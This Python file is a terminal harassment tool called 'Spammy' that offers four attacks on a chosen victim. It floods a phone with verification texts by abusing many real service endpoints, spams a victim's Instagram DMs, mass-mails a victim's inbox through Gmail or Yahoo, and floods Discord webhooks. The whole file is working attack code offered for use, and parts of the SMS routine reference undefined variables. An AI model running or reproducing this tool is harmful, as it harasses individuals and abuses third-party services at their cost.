from colorama import Fore, init
from os import system, name
from time import sleep
from InstagramAPI import InstagramAPI
from discord_webhook import DiscordWebhook, DiscordEmbed
import requests
import random
import json
import smtplib

def clear():
    if name == 'nt':
        _ = system('cls')

    else:
        _ = system('clear')

options = ['1', '2', '3', '4']
banner = f"""
{Fore.MAGENTA}
             https://www.github.com/XxB1a/spammy       
      ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗██╗   ██╗
      ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║╚██╗ ██╔╝
      ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║ ╚████╔╝ 
      ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║  ╚██╔╝  
      ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║   ██║
      ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝   ╚═╝ {Fore.RED} Made by:{Fore.GREEN} XxBiancaXx{Fore.MAGENTA}
      {Fore.RED} Discord:{Fore.GREEN} removed {Fore.MAGENTA}|{Fore.RED} IG:{Fore.GREEN} removed {Fore.MAGENTA}|{Fore.RED} GitHub: {Fore.GREEN}@XxB1a

 {Fore.RED}[{Fore.MAGENTA}1{Fore.RED}]{Fore.GREEN} SMS Bomb (poor)
 {Fore.RED}[{Fore.MAGENTA}2{Fore.RED}]{Fore.GREEN} Instagram Spammer
 {Fore.RED}[{Fore.MAGENTA}3{Fore.RED}]{Fore.GREEN} Email spammer
 {Fore.RED}[{Fore.MAGENTA}4{Fore.RED}]{Fore.GREEN} Discord webhook spammer
{Fore.RESET}"""

def smsbomb():
    clear()
    print(f'{Fore.RED} [{Fore.GREEN}-{Fore.RED}] NOTE: DO NOT TYPE + WITH THE COUNTRY CODE! ALSO, 1 LOOP IS EQUAL TO 15 REQUESTS!')
    print(Fore.RESET)

    cc = int(input(f' {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.GREEN} Country code:{Fore.MAGENTA} '))
    ph = int(input(f' {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.GREEN} Phone number:{Fore.MAGENTA} '))
    tm = int(input(f" {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.GREEN} Amount of loops:{Fore.MAGENTA} "))
    fp = int(str(f'{cc}{ph}'))
    cn = 0

    print(Fore.RESET)
    for i in range(tm):
        cn = cn + 1
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number": f'+{fp}'})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')

        cn = cn + 1
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': fp})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')

        cn = cn + 1
        try:
            requests.post(url=f'https://rutube.ru/api/accounts/sendpass/phone?phone=%2B{fp}')
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')

        cn = cn + 1
        try:
            requests.post(url=f'https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone={fp}&csrf_value=1148ec45f24c4090b3ec7882a57831af')
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')

        cn = cn + 1
        try:
            username = f"ThisSABot{random.randint(1023010, 129419930)}"
            password = f"BottiAcc_{random.randint(111, 9999)}@!"
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": fp, "username": username})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')

        cn = cn + 1
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': fp, "locale": 'en', 'countryCode': 'ru', 'version': '1',"k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :(\n')

        cn = cn + 1
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + fp, "api": 2, "email": "email", "x-email": "x-email"})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": fn})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': f"+{fn}"}, headers=HEADERS)
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": f'+{fn}'})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":f'+{fn}'})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": f'+{fn}'})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": fn, "SignupForm[device_type]": 3})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': fn, "locale": 'en', 'countryCode': cc,'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')
            
        cn = cn + 1
        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': ph, "locale": 'en', 'countryCode': cc,'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} successfull!{Fore.RESET}\n')

        except:
            print(f' {Fore.RED}[-]{Fore.MAGENTA} Sended MSG {Fore.GREEN}{cn}{Fore.MAGENTA} unsuccessfull! :({Fore.RESET}\n')

    clear()
    print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Finished the SMS bomb! Returning...')
    sleep(1.5)
    main()

def igbomb():
    clear()
    print(f' {Fore.RED}[{Fore.GREEN}-{Fore.RED}] InstagramAPI.py by {Fore.GREEN}https://www.github.com/Gumbraise{Fore.RED}. Thank you a lot!')
    print(f' {Fore.RED}[{Fore.GREEN}-{Fore.RED}] This might fail because of a {Fore.CYAN}429 - Too Many Requests{Fore.RED}. This method works by logging into your account and spamming a message, therefore this does not work if you have 2FA enabled! Combolist compatibility will be added soon.')
    print(Fore.RESET)

    victim = str(input(f" {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.MAGENTA} Victim's @:{Fore.GREEN} "))
    accie = str(input(f" {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.MAGENTA} Your @:{Fore.GREEN} "))
    passie = str(input(f" {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.MAGENTA} Your password:{Fore.GREEN} "))
    amount = int(input(f" {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.MAGENTA} Amount of MSG's:{Fore.GREEN} "))
    message = str(input(f" {Fore.RED}[{Fore.GREEN}-{Fore.RED}]{Fore.MAGENTA} Message to spam:{Fore.GREEN} "))
    msgs = 0

    api = InstagramAPI(accie, passie)
    api.login()

    r = requests.get(f"https://www.instagram.com/{victim}/?__a=1")
    respJSON = r.json()
    victim_user_id = str(respJSON['graphql'].get("user").get("id"))

    print(Fore.RESET)
    for i in range(amount):
        msgs = msgs + 1
        api.sendMessage(victim_user_id, message)
        print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended {Fore.GREEN}'{message}'{Fore.MAGENTA} to victim {Fore.CYAN}@{victim} ({victim_user_id}){Fore.MAGENTA}. I sended {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")

    clear()
    print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Finished the DM Spamming! Returning...')
    sleep(1.5)
    main()

def mailbomb():
    clear()
    print(f' {Fore.RED}[{Fore.GREEN}-{Fore.RED}] NOTE: PLEASE ENABLE "LESS SECURE APPS"! ALSO, THIS SPAMMER ONLY WORKS FOR GMAIL AND YAHOO. ALSO, GMAIL HAS A LIMIT OF 500 MAILS PER DAY! ALSO, THIS WORKS BY LOGGING ONTO YOUR EMAIL AND SPAMMING!')
    print(Fore.RESET)
    goy = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} GMail/Yahoo? [{Fore.CYAN}G{Fore.MAGENTA}/{Fore.CYAN}Y{Fore.MAGENTA}]:{Fore.GREEN} '))
    victim = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Victim\'s email:{Fore.GREEN} '))
    mail = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Your email:{Fore.GREEN} '))
    password = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Your password:{Fore.GREEN} '))
    subject = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Spam subject:{Fore.GREEN} '))
    body = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Message:{Fore.GREEN} '))
    amount = int(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Amount of mails:{Fore.GREEN} '))
    msgs = 0

    if goy == 'g' or goy == 'G':
        smtp_server = 'smtp.gmail.com'
        port = 587
        set_server = "gmail"

    elif goy == 'y' or goy == 'Y':
        smtp_server = 'smtp.mail.yahoo.com'
        port = 25
        set_server = "yahoo"

    else:
        print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} You dodn't pick G or Y. Going with GMail!")

        smtp_server = 'smtp.gmail.com'
        port = 587
        set_server = "gmail"

    server = smtplib.SMTP(smtp_server, port)
    server.ehlo()

    if smtp_server == 'smtp.gmail.com':
        server.starttls()

    try:
        server.login(mail, password)

    except smtplib.SMTPAuthenticationError:
        clear()
        print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Invalid mail or password! Returning...')
        sleep(1.5)
        main()

    msg = f'From: {mail}\nSubject: {subject}\n{body}'
    print(Fore.RESET)
    for i in range(amount):
        server.sendmail(mail, victim, msg)
        msgs = msgs + 1
        print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended {Fore.GREEN}'{body}'{Fore.MAGENTA} to victim {Fore.CYAN}{victim}{Fore.MAGENTA}. I sended {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")

    server.quit()

    clear()
    print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Finished the email spamming! Returning...')
    sleep(1.5)
    main()

def webhookspammer():
    clear()
    nom = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Message or Embed? [{Fore.CYAN}M{Fore.MAGENTA}/{Fore.CYAN}E{Fore.MAGENTA}]:{Fore.GREEN} '))
    msgs = 0

    if nom == 'm' or nom == 'M':
        webhook_url = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Webhook URL:{Fore.GREEN} '))
        message = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Message:{Fore.GREEN} '))
        amount = int(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Amount:{Fore.GREEN} '))

        webhook = DiscordWebhook(url=webhook_url, content=message)

    elif nom == 'e' or nom == 'E':
        webhook_url = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Webhook URL:{Fore.GREEN} '))
        embed_title = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Embed title:{Fore.GREEN} '))
        embed_description = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Embed discription:{Fore.GREEN} '))
        amount = int(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Amount:{Fore.GREEN} '))

        webhook = DiscordWebhook(url=webhook_url)
        embed = DiscordEmbed(title=embed_title, description=embed_description, color=242424)
        webhook.add_embed(embed)

    else:
        print(f'\n {Fore.RED}[-]Invalid option! Going with M... ')
        nom = 'M'

        webhook_url = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Webhook URL:{Fore.GREEN} '))
        message = str(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Message:{Fore.GREEN} '))
        amount = int(input(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Amount:{Fore.GREEN} '))

        webhook = DiscordWebhook(url=webhook_url, content=message)
        
    print(Fore.RESET)

    for i in range(amount):
        response = webhook.execute()
        msgs = msgs + 1

        if nom == 'm' or nom == 'M':
            print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended {Fore.GREEN}'{message}'{Fore.MAGENTA} to webhook {Fore.CYAN}{webhook_url}{Fore.MAGENTA}. I sended {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")

        else:
            print(f" {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Sended {Fore.GREEN}'{embed_description}'{Fore.MAGENTA} to webhook {Fore.CYAN}{webhook_url}{Fore.MAGENTA}. I sended {Fore.YELLOW}{msgs}{Fore.MAGENTA} in total!{Fore.RESET}\n")

    clear()
    print(f' {Fore.RED}[{Fore.GREEN}+{Fore.RED}]{Fore.MAGENTA} Finished the webhook spamming! Returning...')
    sleep(1.5)
    main()

def main():
    clear()
    print(f'{banner}')
    option = str(input(f' {Fore.RED}[{Fore.MAGENTA}-{Fore.RED}]{Fore.GREEN} Your choice:{Fore.MAGENTA} '))
    print(Fore.RESET)

    if option not in options:
        clear()
        print(f'{Fore.RED} Option {Fore.GREEN}{option}{Fore.RED} is not valid! Returning in {Fore.GREEN}5{Fore.RED} Seconds!{Fore.RESET}')
        sleep(1)

        clear()
        print(f'{Fore.RED} Option {Fore.GREEN}{option}{Fore.RED} is not valid! Returning in {Fore.GREEN}4{Fore.RED} Seconds!{Fore.RESET}')
        sleep(1)

        clear()
        print(f'{Fore.RED} Option {Fore.GREEN}{option}{Fore.RED} is not valid! Returning in {Fore.GREEN}3{Fore.RED} Seconds!{Fore.RESET}')
        sleep(1)

        clear()
        print(f'{Fore.RED} Option {Fore.GREEN}{option}{Fore.RED} is not valid! Returning in {Fore.GREEN}2{Fore.RED} Seconds!{Fore.RESET}')
        sleep(1)

        clear()
        print(f'{Fore.RED} Option {Fore.GREEN}{option}{Fore.RED} is not valid! Returning in {Fore.GREEN}1{Fore.RED} Second!{Fore.RESET}')
        sleep(1)

        clear()
        print(f'{Fore.RED} Returning!')
        main()

    else:
        if option == '1':
            smsbomb()

        elif option == '2':
            igbomb()

        elif option == '3':
            mailbomb()

        elif option == '4':
            webhookspammer()

if __name__ == '__main__':
    init(convert=True)
    main()
